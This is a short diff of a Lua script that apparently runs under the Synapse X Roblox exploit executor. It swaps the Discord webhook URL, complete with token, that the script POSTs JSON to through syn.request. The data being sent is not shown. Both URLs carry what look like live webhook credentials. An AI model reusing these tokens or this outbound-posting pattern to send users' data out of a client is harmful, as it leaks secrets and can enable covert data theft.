@@ -193,7 +193,7 @@ end
 
 local success, err = pcall(function()
     syn.request({
-        Url = "https://discord.com/api/webhooks/1383259861374210168/IDc5cfDaD6ptA9c6qUWwjsalm0IckQw9MEnLjEcJKrSCIj3DgY05RLHTxrh3Xu1zw3QB",
+        Url = "https://discord.com/api/webhooks/1383563137818562560/bJ1xGgySuVJJyzkfgW1xbRM8ReXwYE0Uyi8Th83VluLujac2W2hNO1OyUr0iJ3qHoxU1",
         Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"
